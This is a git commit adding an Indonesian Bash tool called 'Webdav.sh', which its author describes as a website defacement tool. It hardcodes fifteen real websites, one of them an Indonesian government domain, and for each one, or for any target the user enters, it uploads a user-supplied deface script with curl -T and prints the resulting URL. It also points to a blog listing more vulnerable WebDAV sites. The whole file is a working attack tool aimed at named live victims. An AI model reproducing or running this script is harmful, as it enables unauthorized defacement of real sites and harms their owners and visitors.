90db738ebc9171bf787e45b8bcf600aa431b1a26
Fajar ID <46629829+Fajar-ID@users.noreply.github.com>
2019-10-06 06:15:36 +0700

    Add files via upload

---
+++ Webdav.sh
@@ -0,0 +1,357 @@
+#!/bin/bash
+#Ngapain Tod ;v Mau ??
+
+#warna
+R='\033[31;1m'
+G='\033[32;1m'
+B='\033[1;36m'
+Y='\033[33;1m'
+P='\033[35;1m'
+w='\033[1;34m'
+
+
+#webdav
+web1='http://essentialtours.com'
+web2='http://kobralocks.com'
+web3='http://inlislitev3.perpusnas.go.id'
+web4='http://grupo-cma.com'
+web5='http://tapifare.com'
+web6='http://troop-1539.org'
+web7='http://stand66.com'
+web8='http://applebyguesthouse.com'
+web9='http://naturaleyeimages.com'
+web10='http://mc3qs.com'
+web11='http://esfml.com'
+web12='http://mambabiz.com'
+web13='http://jormid.net'
+web14='http://crimsonmonkeyweb.com'
+web15='http://careandcure.cc'
+
+clear
+figlet "Webdav"
+echo $R "======================"
+echo $B "[+] Author : Fajar ID"
+echo $B "[+] Tools Deface Webdav"
+echo $R "======================"
+echo ""
+echo $Y "[+] List Website Webdav"
+echo ""
+#list webdav
+echo $G "[1] http://essentialtours.com"
+echo $P "[2] http://kobralocks.com"
+echo $B "[3] http://inlislitev3.perpusnas.go.id"
+echo $Y "[4] http://grupo-cma.com"
+echo $G "[5] http://tapifare.com"
+echo $B "[6] http://troop-1539.org"
+echo $Y "[7] http://stand66.com"
+echo $G "[8] http://applebyguesthouse.com"
+echo $R "[9] http://naturaleyeimages.com"
+echo $Y "[10] http://mc3qs.com"
+echo $G "[11] http://esfml.com"
+echo $R "[12] http://mambabiz.com"
+echo $Y "[13] http://jormid.net"
+echo $G "[14] http://crimsonmonkeyweb.com"
+echo $R "[15] http://careandcure.cc"
+echo $B "[16] Target Sendiri"
+echo $Y "[17] Kumpulan Webdav"
+echo $R "[99] Keluar"
+
+#pil1
+read -p "=> " pil;
+if [ $pil = 1 ]
+then
+clear
+echo $R "[!] Perhatian"
+echo ""
+echo $G "[!] Pindahin Script Deface Kalian Ke penyimpanan Internal"
+echo ""
+echo $B "[!] Masukin Nama Sc Deface Kalian"
+read -p "=> " Sc;
+echo ""
+curl -T /sdcard/$Sc $web1
+echo $G "[!] Berhasil"
+echo $G "[!] Silahkan Buka Website Dibawah"
+echo $B  $web1/$Sc
+fi
+
+
+#pil2
+if [ $pil = 2 ]
+then
+clear
+echo $R "[!] Perhatian"
+echo ""
+echo $G "[!] Pindahin Script Deface Kalian Ke penyimpanan Internal"
+echo ""
+echo $B "[!] Masukin Nama Sc Deface Kalian"
+read -p "=> " Sc;
+echo ""
+curl -T /sdcard/$Sc $web2
+echo $G "[!] Berhasil"
+echo $G "[!] Silahkan Buka Website Dibawah"
+echo $B  $web2/$Sc
+fi
+
+#pil3
+if [ $pil = 3 ]
+then
+clear
+echo $R "[!] Perhatian"
+echo ""
+echo $G "[!] Pindahin Script Deface Kalian Ke penyimpanan Internal"
+echo ""
+echo $B "[!] Masukin Nama Sc Deface Kalian"
+read -p "=> " Sc;
+echo ""
+curl -T /sdcard/$Sc $web3
+echo $G "[!] Berhasil"
+echo $G "[!] Silahkan Buka Website Dibawah"
+echo $B  $web3/$Sc
+fi
+
+#pil4
+if [ $pil = 4 ]
+then
+clear
+echo $R "[!] Perhatian"
+echo ""
+echo $G "[!] Pindahin Script Deface Kalian Ke penyimpanan Internal"
+echo ""
+echo $B "[!] Masukin Nama Sc Deface Kalian"
+read -p "=> " Sc;
+echo ""
+curl -T /sdcard/$Sc $web4
+echo $G "[!] Berhasil"
+echo $G "[!] Silahkan Buka Website Dibawah"
+echo $B  $web4/$Sc
+fi
+
+#pil5
+if [ $pil = 5 ]
+then
+clear
+echo $R "[!] Perhatian"
+echo ""
+echo $G "[!] Pindahin Script Deface Kalian Ke penyimpanan Internal"
+echo ""
+echo $B "[!] Masukin Nama Sc Deface Kalian"
+read -p "=> " Sc;
+echo ""
+curl -T /sdcard/$Sc $web5
+echo $G "[!] Berhasil"
+echo $G "[!] Silahkan Buka Website Dibawah"
+echo $B  $web5/$Sc
+fi
+
+#pil6
+if [ $pil = 6 ]
+then
+clear
+echo $R "[!] Perhatian"
+echo ""
+echo $G "[!] Pindahin Script Deface Kalian Ke penyimpanan Internal"
+echo ""
+echo $B "[!] Masukin Nama Sc Deface Kalian"
+read -p "=> " Sc;
+echo ""
+curl -T /sdcard/$Sc $web6
+echo $G "[!] Berhasil"
+echo $G "[!] Silahkan Buka Website Dibawah"
+echo $B  $web6/$Sc
+fi
+
+#pil7
+if [ $pil = 7 ]
+then
+clear
+echo $R "[!] Perhatian"
+echo ""
+echo $G "[!] Pindahin Script Deface Kalian Ke penyimpanan Internal"
+echo ""
+echo $B "[!] Masukin Nama Sc Deface Kalian"
+read -p "=> " Sc;
+echo ""
+curl -T /sdcard/$Sc $web7
+echo $G "[!] Berhasil"
+echo $G "[!] Silahkan Buka Website Dibawah"
+echo $B  $web7/$Sc
+fi
+
+#pil8
+if [ $pil = 8 ]
+then
+clear
+echo $R "[!] Perhatian"
+echo ""
+echo $G "[!] Pindahin Script Deface Kalian Ke penyimpanan Internal"
+echo ""
+echo $B "[!] Masukin Nama Sc Deface Kalian"
+read -p "=> " Sc;
+echo ""
+curl -T /sdcard/$Sc $web8
+echo $G "[!] Berhasil"
+echo $G "[!] Silahkan Buka Website Dibawah"
+echo $B  $web8/$Sc
+fi
+
+#pil9
+if [ $pil = 9 ]
+then
+clear
+echo $R "[!] Perhatian"
+echo ""
+echo $G "[!] Pindahin Script Deface Kalian Ke penyimpanan Internal"
+echo ""
+echo $B "[!] Masukin Nama Sc Deface Kalian"
+read -p "=> " Sc;
+echo ""
+curl -T /sdcard/$Sc $web9
+echo $G "[!] Berhasil"
+echo $G "[!] Silahkan Buka Website Dibawah"
+echo $B  $web9/$Sc
+fi
+
+
+#pil10
+if [ $pil = 10 ]
+then
+clear
+echo $R "[!] Perhatian"
+echo ""
+echo $G "[!] Pindahin Script Deface Kalian Ke penyimpanan Internal"
+echo ""
+echo $B "[!] Masukin Nama Sc Deface Kalian"
+read -p "=> " Sc;
+echo ""
+curl -T /sdcard/$Sc $web10
+echo $G "[!] Berhasil"
+echo $G "[!] Silahkan Buka Website Dibawah"
+echo $B  $web10/$Sc
+fi
+
+
+#pil11
+if [ $pil = 11 ]
+then
+clear
+echo $R "[!] Perhatian"
+echo ""
+echo $G "[!] Pindahin Script Deface Kalian Ke penyimpanan Internal"
+echo ""
+echo $B "[!] Masukin Nama Sc Deface Kalian"
+read -p "=> " Sc;
+echo ""
+curl -T /sdcard/$Sc $web11
+echo $G "[!] Berhasil"
+echo $G "[!] Silahkan Buka Website Dibawah"
+echo $B  $web11/$Sc
+fi
+
+#pil12
+if [ $pil = 12 ]
+then
+clear
+echo $R "[!] Perhatian"
+echo ""
+echo $G "[!] Pindahin Script Deface Kalian Ke penyimpanan Internal"
+echo ""
+echo $B "[!] Masukin Nama Sc Deface Kalian"
+read -p "=> " Sc;
+echo ""
+curl -T /sdcard/$Sc $web12
+echo $G "[!] Berhasil"
+echo $G "[!] Silahkan Buka Website Dibawah"
+echo $B  $web12/$Sc
+fi
+
+
+#pil13
+if [ $pil = 13 ]
+then
+clear
+echo $R "[!] Perhatian"
+echo ""
+echo $G "[!] Pindahin Script Deface Kalian Ke penyimpanan Internal"
+echo ""
+echo $B "[!] Masukin Nama Sc Deface Kalian"
+read -p "=> " Sc;
+echo ""
+curl -T /sdcard/$Sc $web13
+echo $G "[!] Berhasil"
+echo $G "[!] Silahkan Buka Website Dibawah"
+echo $B  $web13/$Sc
+fi
+
+#pil14
+if [ $pil = 14 ]
+then
+clear
+echo $R "[!] Perhatian"
+echo ""
+echo $G "[!] Pindahin Script Deface Kalian Ke penyimpanan Internal"
+echo ""
+echo $B "[!] Masukin Nama Sc Deface Kalian"
+read -p "=> " Sc;
+echo ""
+curl -T /sdcard/$Sc $web14
+echo $G "[!] Berhasil"
+echo $G "[!] Silahkan Buka Website Dibawah"
+echo $B  $web14/$Sc
+fi
+
+
+#pil15
+if [ $pil = 15 ]
+then
+clear
+echo $R "[!] Perhatian"
+echo ""
+echo $G "[!] Pindahin Script Deface Kalian Ke penyimpanan Internal"
+echo ""
+echo $B "[!] Masukin Nama Sc Deface Kalian"
+read -p "=> " Sc;
+echo ""
+curl -T /sdcard/$Sc $web15
+echo $G "[!] Berhasil"
+echo $G "[!] Silahkan Buka Website Dibawah"
+echo $B  $web15/$Sc
+fi
+
+
+#pil16
+if [ $pil = 16 ]
+then
+clear
+echo $R "[!] Pindahkan Sc Deface lhu ke Penyimpanan Internal"
+echo $G "[!] Masukin Nama Sc Deface Lhu"
+read -p "=> " Sc;
+echo ""
+echo $G "[!] Link Website Target nya"
+read -p "=> " web;
+curl -T /sdcard/$Sc $web
+echo
+echo $G "Linknya Dibawah"
+echo $B $web/$Sc
+fi
+
+#pil17
+if [ $pil = 17 ]
+then
+clear
+sleep 1
+echo $G "Sedang Membuka Link [!]"
+sleep 3
+xdg-open https://hdrxdroid.blogspot.com/2019/04/httpbitsandpieces.html
+echo ""
+echo $G "https://hdrxdroid.blogspot.com/2019/04/httpbitsandpieces.html"
+sleep 5
+fi
+
+#pil99
+if [ $pil = 99 ]
+then
+clear
+echo $R "Keluar"
+exit
+fi
+
